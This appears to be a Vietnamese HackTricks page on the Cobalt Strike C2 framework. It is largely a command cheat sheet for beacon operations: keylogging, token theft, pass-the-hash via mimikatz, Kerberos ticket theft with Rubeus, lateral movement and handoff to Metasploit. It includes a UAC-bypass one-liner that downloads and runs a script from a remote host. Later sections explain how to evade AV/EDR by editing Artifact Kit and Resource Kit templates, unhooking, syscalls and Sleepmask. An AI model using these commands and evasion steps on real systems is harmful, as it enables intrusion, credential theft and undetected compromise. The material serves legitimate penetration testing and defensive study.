# Cobalt Strike

{{#include ../banners/hacktricks-training.md}}

### Trình lắng nghe

### Trình lắng nghe C2

`Cobalt Strike -> Listeners -> Add/Edit` rồi bạn có thể chọn nơi lắng nghe, loại beacon cần sử dụng (http, dns, smb...) và nhiều tùy chọn khác.

### Trình lắng nghe Peer2Peer

Các beacon của những trình lắng nghe này không cần giao tiếp trực tiếp với C2; chúng có thể giao tiếp với C2 thông qua các beacon khác.

`Cobalt Strike -> Listeners -> Add/Edit` rồi chọn beacon TCP hoặc SMB

* **Beacon TCP sẽ thiết lập một trình lắng nghe trên cổng đã chọn**. Để kết nối với beacon TCP, hãy dùng lệnh `connect <ip> <port>` từ một beacon khác.
* **Beacon SMB sẽ lắng nghe trên một pipename có tên đã chọn**. Để kết nối với beacon SMB, bạn cần dùng lệnh `link [target] [pipe]`.

### Tạo và host payload

#### Tạo payload dưới dạng file

`Attacks -> Packages ->`

* **`HTMLApplication`** cho file HTA
* **`MS Office Macro`** cho tài liệu Office có macro
* **`Windows Executable`** cho file .exe, .dll hoặc service .exe
* **`Windows Executable (S)`** cho file .exe, .dll hoặc service .exe **stageless** (stageless tốt hơn staged và có ít IoC hơn)

#### Tạo và host payload

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` sẽ tạo script/file thực thi để tải beacon từ Cobalt Strike ở các định dạng như: bitsadmin, exe, powershell và python.

#### Host payload

Nếu bạn đã có file muốn host trên một web server, hãy vào `Attacks -> Web Drive-by -> Host File`, rồi chọn file cần host và cấu hình web server.

### Tùy chọn Beacon

<details>
<summary>Tùy chọn và lệnh của Beacon</summary>

```bash
# Execute local .NET binary
execute-assembly </path/to/executable.exe>
# Note that to load assemblies larger than 1MB, the 'tasks_max_size' property of the malleable profile needs to be modified.

# Screenshots
printscreen    # Take a single screenshot via PrintScr method
screenshot     # Take a single screenshot
screenwatch    # Take periodic screenshots of desktop
## Go to View -> Screenshots to see them

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes to see the keys pressed

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Import Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <just write powershell cmd here> # Uses the highest supported PowerShell version (not OPSEC-friendly)
powerpick <cmdlet> <args> # This creates a sacrificial process specified by spawnto, and injects UnmanagedPowerShell into it for better opsec (not logging)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # This injects UnmanagedPowerShell into the specified process to run the PowerShell cmdlet.


# User impersonation
## Token generation with creds
make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token generated with make_token
## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steal token from pid
## Like make_token but stealing the token from a process
steal_token [pid] # Also, this is useful for network actions, not local actions
## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated <current_username> - it's impersonating our own cloned token.
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token from steal_token

## Launch process with nwe credentials
spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\
## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).

## Inject into process
inject [pid] [x64|x86] [listener]
## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).

## Pass the hash
## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash through mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Without /run, Mimikatz spawns cmd.exe; an interactive desktop user may see the shell (SYSTEM sessions are not normally visible)
steal_token <pid> #Steal token from process created by mimikatz

## Pass the ticket
## Request a ticket
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
make_token <domain>\<username> DummyPass
## Write the ticket on the attacker machine from a PowerShell session and load it
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM
## Generate a new process with the ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Steal the token from that process
steal_token <pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump an interesting ticket by LUID
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Create new logon session, note luid and processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insert ticket in generate logon session
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finally, steal the token from that new process
steal_token <pid>

# Lateral Movement
## If a token was created it will be used
jump [method] [target] [listener]
## Methods:
## psexec                    x86   Use a service to run a Service EXE artifact
## psexec64                  x64   Use a service to run a Service EXE artifact
## psexec_psh                x86   Use a service to run a PowerShell one-liner
## winrm                     x86   Run a PowerShell script via WinRM
## winrm64                   x64   Run a PowerShell script via WinRM
## wmi_msbuild               x64   WMI lateral movement with an MSBuild inline C# task (OPSEC)


remote-exec [method] [target] [command] # remote-exec doesn't return output
## Methods:
## psexec                          Remote execute via Service Control Manager
## winrm                           Remote execute via WinRM (PowerShell)
## wmi                             Remote execute via WMI

## To execute a beacon with wmi (it isn't in the jump command) just upload the beacon and execute it
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## On the Metasploit host
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.
beacon> spawn metasploit
## You can only spawn x86 Meterpreter sessions with the foreign listener.

# Pass session to Metasploit - Through shellcode injection
## On metasploit host
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Run msfvenom and prepare the multi/handler listener

## Copy bin file to cobalt strike host
ps
shinject <pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process

# Pass metasploit session to cobalt strike
## Generate stageless Beacon shellcode: go to Attacks > Packages > Windows Executable (S), select the listener, choose Raw output, and enable the x64 payload.
## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode


# Pivoting
## Open a socks proxy in the teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password
```

</details>

### Custom implants / Linux Beacons

- Một custom agent chỉ cần giao tiếp theo giao thức HTTP/S của Cobalt Strike Team Server (malleable C2 profile mặc định) để đăng ký/check-in và nhận task. Triển khai cùng URI/header/metadata crypto được định nghĩa trong profile để dùng lại giao diện Cobalt Strike cho việc giao task và xem output.<sup>[[1]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>
- Aggressor Script (ví dụ: `CustomBeacon.cna`) có thể bọc quy trình tạo payload cho beacon không phải Windows, để operator có thể chọn listener và tạo payload ELF trực tiếp từ GUI.
- Ví dụ về các trình xử lý task Linux được cung cấp cho Team Server: `sleep`, `cd`, `pwd`, `shell` (thực thi lệnh tùy ý), `ls`, `upload`, `download` và `exit`. Các lệnh này ánh xạ tới task ID mà Team Server yêu cầu và phải được triển khai phía server để trả về output đúng định dạng.
- Có thể bổ sung hỗ trợ BOF trên Linux bằng cách nạp Beacon Object Files trong tiến trình với [ELFLoader của TrustedSec](https://github.com/trustedsec/ELFLoader) (cũng hỗ trợ BOF kiểu Outflank), cho phép chạy post-exploitation theo mô-đun trong context/privilege của implant mà không tạo tiến trình mới.<sup>[[2]](#references)[[3]](#references)</sup>
  Để biết thêm về định dạng loader của Linux và các lưu ý về ranh giới tiến trình, kèm ví dụ giao task BOF riêng, xem [Linux BOF loader formats and process boundaries](../linux-hardening/post-exploitation/linux-fileless-execution.md#linux-bof-loader-formats-and-process-boundaries).
- Nhúng SOCKS handler vào custom beacon để duy trì khả năng pivot tương đương Windows Beacons: khi operator chạy `socks <port>`, implant cần mở một proxy cục bộ để định tuyến công cụ của operator qua máy Linux bị xâm nhập vào các mạng nội bộ.

## Opsec

### Execute-Assembly

**`execute-assembly`** sử dụng **sacrificial process** và remote process injection để thực thi chương trình được chỉ định. Cách này rất ồn ào, vì để inject vào một tiến trình, cần dùng một số Win API mà mọi EDR đều kiểm tra. Tuy nhiên, có một số công cụ tùy chỉnh có thể dùng để nạp nội dung ngay trong cùng tiến trình:

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- Trong Cobalt Strike, bạn cũng có thể dùng BOF (Beacon Object Files): [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)

Aggressor Script `https://github.com/outflanknl/HelpColor` sẽ tạo lệnh `helpx` trong Cobalt Strike, lệnh này tô màu các command để cho biết chúng là BOF (màu xanh lá), Frok&Run (màu vàng) hoặc ProcessExecution, injection hay tương tự (màu đỏ). Điều này giúp nhận biết command nào stealthier hơn.

### Post-execution hiện đại trong tiến trình

Các phiên bản gần đây bổ sung hai lựa chọn thay thế khi một COFF BOF cổ điển bị giới hạn quá nhiều:

- **Beacon Interpreter** biên dịch C trên Team Server thành bytecode trung gian và thực thi bytecode trong VM được nhúng trong Beacon. Bytecode vẫn là dữ liệu thay vì mã thực thi native, nhờ đó tránh phải cấp phát vùng nhớ thực thi bổ sung và chuyển quyền từ RW sang RX như thường cần khi nạp BOF. Script có thể import Beacon API và khai báo các prototype Dynamic Function Resolution (DFR) theo kiểu BOF.
- **BOF-PE** nạp một EXE hoặc DLL hoàn chỉnh vào Beacon hiện tại. Định dạng này hỗ trợ PE import thông thường, xử lý exception, C++ phong phú hơn và thư viện bên ngoài, đồng thời vẫn giữ Beacon API. Cách này nặng hơn một COFF BOF nhỏ, vì vậy chỉ nên chọn khi runtime bổ sung thực sự hữu ích.

```bash
# Compile a C script on the Team Server and execute its bytecode
beacon-interpreter /path/to/script.c

# Execute a BOF-PE in the current Beacon
inline-execute-pe /path/to/tool.x64.exe
```

Các cơ chế này giảm tín hiệu liên quan đến loader, chứ không giảm telemetry do các hành động của script hoặc các lệnh gọi Windows API tạo ra.<sup>[[8]](#references)</sup>

### Đóng vai người dùng

Bạn có thể kiểm tra các sự kiện như `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents`: 

- Security EID 4624 - Kiểm tra tất cả các lần đăng nhập tương tác để biết giờ hoạt động thông thường.
- System EID 12,13 - Kiểm tra tần suất tắt máy/khởi động/ngủ.
- Security EID 4624/4625 - Kiểm tra các lần thử NTLM đến hợp lệ/không hợp lệ.
- Security EID 4648 - Sự kiện này được tạo khi thông tin xác thực dạng plaintext được dùng để đăng nhập. Nếu một process tạo ra sự kiện này, binary có thể chứa thông tin xác thực ở dạng văn bản thuần trong file cấu hình hoặc trong code.

Khi dùng `jump` từ Cobalt Strike, tốt hơn nên dùng phương thức `wmi_msbuild` để process mới trông hợp lệ hơn.

### Dùng computer account

Defender thường kiểm tra các hành vi bất thường do người dùng tạo ra và **loại trừ service account cùng computer account như `*$` khỏi phạm vi giám sát**. Bạn có thể dùng các account này để lateral movement hoặc privilege escalation.

### Dùng stageless payload

Stageless payload ít gây chú ý hơn staged payload vì chúng không cần tải stage thứ hai từ máy chủ C2. Điều này có nghĩa là sau kết nối ban đầu, chúng không tạo thêm lưu lượng mạng, nên ít có khả năng bị các cơ chế phòng thủ dựa trên mạng phát hiện hơn.

### Token & Token Store

Hãy cẩn thận khi đánh cắp hoặc tạo token vì EDR có thể liệt kê thread token và phát hiện **token thuộc về người dùng khác** hoặc thậm chí là SYSTEM bên trong process.

Tính năng này cho phép lưu token **theo từng beacon**, do đó không cần đánh cắp cùng một token nhiều lần. Điều này hữu ích cho lateral movement hoặc khi bạn cần dùng token đã đánh cắp nhiều lần:

- `token-store steal <pid>`
- `token-store steal-and-use <pid>`
- token-store show
- `token-store use <id>`
- `token-store remove <id>`
- token-store remove-all

Khi lateral movement, thông thường **đánh cắp token sẽ tốt hơn tạo token mới** hoặc thực hiện tấn công pass the hash.

### Guardrails

Cobalt Strike có tính năng **Guardrails**, giúp ngăn việc dùng một số lệnh hoặc hành động có thể bị defender phát hiện. Có thể cấu hình Guardrails để chặn các lệnh cụ thể như `make_token`, `jump`, `remote-exec` và những lệnh khác thường được dùng cho lateral movement hoặc privilege escalation.

Ngoài ra, repo [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) cũng có một số bước kiểm tra và ý tưởng bạn có thể cân nhắc trước khi thực thi payload.

### Mã hóa ticket

Trong AD, hãy chú ý đến phương thức mã hóa ticket. Theo mặc định, một số công cụ sẽ dùng mã hóa RC4 cho Kerberos ticket, vốn kém an toàn hơn mã hóa AES; các môi trường được cập nhật thường dùng AES theo mặc định. Defender giám sát các thuật toán mã hóa yếu có thể phát hiện điều này.

### Tránh dùng mặc định

Khi dùng Cobalt Strike, theo mặc định các SMB pipe sẽ có tên `msagent_####` và `"status_####`. Hãy đổi các tên này. Có thể kiểm tra tên các pipe hiện có từ Cobalt Strike bằng lệnh: `ls \\.\pipe\`

Ngoài ra, trong các phiên SSH, một pipe có tên `\\.\pipe\postex_ssh_####` sẽ được tạo. Hãy đổi tên bằng `set ssh_pipename "<new_name>";`.

Tương tự, trong các cuộc tấn công khai thác poext, có thể sửa các pipe `\\.\pipe\postex_####` bằng `set pipename "<new_name>"`.

Trong profile Cobalt Strike, bạn cũng có thể sửa những mục như:

- Tránh dùng `rwx`
- Cách hoạt động của process injection (API nào sẽ được dùng) trong khối `process-inject {...}`
- Cách hoạt động của "fork and run" trong khối `post-ex {…}`
- Thời gian sleep
- Kích thước tối đa của binary được tải vào bộ nhớ
- Dấu chân bộ nhớ và nội dung DLL bằng khối `stage {...}`
- Lưu lượng mạng

### Sleepmask và BeaconGate

Sleepmask biến đổi Beacon cùng các heap allocation được theo dõi khi Beacon đang ngủ, sau đó khôi phục chúng để thực thi tác vụ. Các bản phát hành hiện tại cung cấp cấu hình mặc định có tính né tránh, nhưng Sleepmask BOF tùy chỉnh vẫn hữu ích khi có yêu cầu khác về bố cục bộ nhớ, allocation hoặc call stack. Kể từ phiên bản 4.13, Sleepmask mặc định cũng giả mạo địa chỉ trả về của các API được proxy thông qua BeaconGate.<sup>[[8]](#references)</sup>

**BeaconGate** mở rộng thiết kế này ra ngoài `Sleep`: các lệnh gọi WinAPI được chọn sẽ được biểu diễn dưới dạng cấu trúc `FUNCTION_CALL` và chuyển tiếp đến Sleepmask BOF, nơi có thể che giấu Beacon trong khi thực thi lệnh gọi. Profile có thể bật gate cho một nhóm (`Comms`, `Core`, `Cleanup` hoặc `All`) hoặc chỉ cho từng API riêng lẻ:<sup>[[9]](#references)</sup>

```text
stage {
    set sleep_mask "true";
    set syscall_method "Indirect";

    beacon_gate {
        VirtualAlloc;       # Routed through BeaconGate
        VirtualAllocEx;
        InternetConnectA;
    }
}
```

For API được liệt kê trong `beacon_gate`, gate được ưu tiên hơn `syscall_method`; các API không được liệt kê vẫn có thể dùng phương thức syscall đã cấu hình. `beacon_gate disable` và `beacon_gate enable` bật/tắt tính năng khi chạy. Tránh bật `All` một cách mù quáng: các lệnh như `ps` gọi `OpenProcess`/`CloseHandle` liên tục và có thể làm CPU tăng đột biến khi mọi lời gọi đều che giấu rồi bỏ che giấu Beacon. Sleepmask-VS cung cấp trạng thái Beacon/Sleepmask giả lập để debug các gate tùy chỉnh mà không phải liên tục kiểm thử chúng thông qua implant đang hoạt động.<sup>[[9]](#references)</sup>

### Tiêm mã vào process gây nhiều cảnh báo

Việc tiêm mã vào một process thường gây nhiều cảnh báo, vì **thông thường không có process nào thực hiện hành động này và các cách thực hiện cũng rất hạn chế**. Vì vậy, hành vi này có thể bị các hệ thống phát hiện dựa trên hành vi phát hiện. Hơn nữa, EDR cũng có thể quét mạng để tìm **các thread chứa mã không có trên đĩa** (mặc dù những process như trình duyệt thường có mã như vậy khi dùng JIT). Ví dụ: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | Quan hệ PID và PPID

Khi tạo một process mới, điều quan trọng là **duy trì quan hệ cha-con thông thường** giữa các process để tránh bị phát hiện. Nếu svchost.exec chạy iexplorer.exe thì sẽ trông đáng ngờ, vì svchost.exe không phải là process cha của iexplorer.exe trong môi trường Windows thông thường.

Theo mặc định, khi một Beacon mới được tạo trong Cobalt Strike, một process dùng **`rundll32.exe`** sẽ được tạo để chạy listener mới. Cách này không kín đáo và EDR có thể dễ dàng phát hiện. Hơn nữa, `rundll32.exe` được chạy mà không có tham số nào, khiến nó càng đáng ngờ hơn.

Với lệnh Cobalt Strike sau đây, bạn có thể chỉ định một process khác để tạo Beacon mới, giúp nó khó bị phát hiện hơn:

```bash
spawnto x86 svchost.exe
```

Bạn cũng có thể thay đổi thiết lập **`spawnto_x86` và `spawnto_x64`** trong profile.

### Chuyển tiếp traffic của attacker

Đôi khi attacker cần chạy công cụ cục bộ, kể cả trên máy Linux, và chuyển traffic của victim đến công cụ đó (ví dụ: NTLM relay).

Ngoài ra, đôi khi để thực hiện tấn công pass-the.hash hoặc pass-the-ticket, attacker sẽ kín đáo hơn nếu **thêm hash hoặc ticket này vào tiến trình LSASS của chính mình** trên máy cục bộ, rồi pivot từ đó thay vì sửa đổi tiến trình LSASS trên máy của victim.

Tuy nhiên, bạn cần **cẩn thận với traffic được tạo ra**, vì backdoor có thể gửi traffic bất thường (Kerberos?) từ tiến trình của nó. Để tránh điều này, bạn có thể pivot sang một tiến trình trình duyệt (dù bạn có thể bị phát hiện khi inject vào tiến trình, nên hãy nghĩ cách thực hiện kín đáo).


### Tránh AV

#### Bypass AV/AMSI/ETW

Xem trang:


{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

Thông thường, bạn có thể tìm thấy mã nguồn và các template được biên dịch sẵn (trong `/src-common`) của các payload mà Cobalt Strike sẽ dùng để tạo binary beacon tại `/opt/cobaltstrike/artifact-kit`.

Dùng [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) với backdoor đã tạo (hoặc chỉ với template đã biên dịch), bạn có thể tìm ra nguyên nhân khiến Defender kích hoạt cảnh báo. Nguyên nhân thường là một chuỗi ký tự. Do đó, bạn chỉ cần sửa mã tạo backdoor để chuỗi đó không xuất hiện trong binary cuối cùng.

Sau khi sửa mã, chỉ cần chạy `./build.sh` từ cùng thư mục và sao chép thư mục `dist-pipe/` vào Windows client tại `C:\Tools\cobaltstrike\ArtifactKit`.

```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```

Đừng quên tải script aggressive `dist-pipe\artifact.cna` để chỉ định Cobalt Strike sử dụng các tài nguyên trên ổ đĩa mà chúng ta muốn, thay vì các tài nguyên đã được tải.

#### Resource Kit

Thư mục ResourceKit chứa các template cho payload dựa trên script của Cobalt Strike, bao gồm PowerShell, VBA và HTA.

Sử dụng [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) cùng với các template, bạn có thể tìm ra Defender (trong trường hợp này là AMSI) không thích điều gì và chỉnh sửa nó:

```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```

Chỉnh sửa các dòng được phát hiện, bạn có thể tạo một template không bị phát hiện.

Đừng quên nạp script aggressive `ResourceKit\resources.cna` để chỉ định cho Cobalt Strike sử dụng các resource trên disk mà chúng ta muốn, thay vì những resource đã được nạp.

#### Function hooks | Syscall

Function hooking là một phương pháp rất phổ biến được các EDR sử dụng để phát hiện hoạt động độc hại. Cobalt Strike cho phép bạn bypass các hook này bằng cách sử dụng **syscalls** thay cho các lệnh gọi Windows API tiêu chuẩn với cấu hình **`None`**, sử dụng phiên bản `Nt*` của một function với thiết lập **`Direct`**, hoặc chỉ nhảy qua function `Nt*` bằng tùy chọn **`Indirect`** trong malleable profile. Tùy hệ thống, một tùy chọn có thể stealth hơn tùy chọn khác.

Bạn có thể thiết lập điều này trong profile hoặc dùng lệnh **`syscall-method`**.

Tuy nhiên, cách này cũng có thể gây nhiều tiếng ồn.

Một tùy chọn Cobalt Strike cung cấp để bypass function hook là gỡ bỏ các hook đó bằng [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof).

Bạn cũng có thể kiểm tra những function nào đang bị hook bằng [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) hoặc [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector)




<details>
<summary>Các lệnh Cobalt Strike khác</summary>

```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```

</details>



## References

- [1] [Cobalt Strike Linux Beacon (PoC implant tùy chỉnh)](https://github.com/EricEsquivel/CobaltStrike-Linux-Beacon)
- [2] [TrustedSec ELFLoader & Linux BOFs](https://github.com/trustedsec/ELFLoader)
- [3] [Mẫu nix BOF của Outflank](https://github.com/outflanknl/nix_bof_template)
- [4] [Phân tích của Unit42 về mã hóa metadata của Cobalt Strike](https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/)
- [5] [Nhật ký SANS ISC về lưu lượng Cobalt Strike](https://isc.sans.edu/diary/27968)
- [6] [cs-decrypt-metadata-py](https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/)
- [7] [SentinelOne CobaltStrikeParser](https://github.com/Sentinel-One/CobaltStrikeParser)
- [8] [Cobalt Strike 4.13: Lạc mất trong bản dịch](https://www.cobaltstrike.com/blog/cobalt-strike-413-lost-in-translation)
- [9] [Cobalt Strike 4.10: Băng qua BeaconGate](https://www.cobaltstrike.com/blog/cobalt-strike-410-through-the-beacongate?p=6046)
{{#include ../banners/hacktricks-training.md}}
